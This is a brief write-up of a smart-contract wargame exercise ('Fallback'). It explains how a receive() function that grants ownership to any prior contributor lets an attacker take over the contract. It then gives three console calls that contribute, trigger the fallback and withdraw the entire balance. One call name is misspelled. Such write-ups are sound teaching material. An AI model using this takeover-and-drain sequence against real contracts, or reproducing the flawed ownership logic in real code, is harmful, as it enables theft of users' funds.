## Exercise 1: Fallback

This is a very simple exploit enabled by the ownership change included in the receive() fallback function.

```solidity

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }

```

Here we can see that if any ether is sent to this contract, the sender of the ether takes ownership of the contract. The contract owner is then able to drain the contract of funds via the `withdraw` function:


```javascript
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

The only slight complication is that in order to switch ownership in the fallback function, the ether sender must have made a contribution to the contract via the `contribute` function. 

So, taking ownership of this contract and draining it of funds can be achieved in the following steps:

1) Send some small amount of wei to the contract so our address is included in contributions mapping:
   
   ```javascript
   contract.contribute({value:'1000'})
   ```

2) send some ether to the contract, triggering the fallback function
   ```javascript
    contract.sendTransation({value:'100000'})
   ```

3) now we own the contract, drain the funds using the contract's withdraw() func:
   ```javascript
    contract.withdraw()
   ```

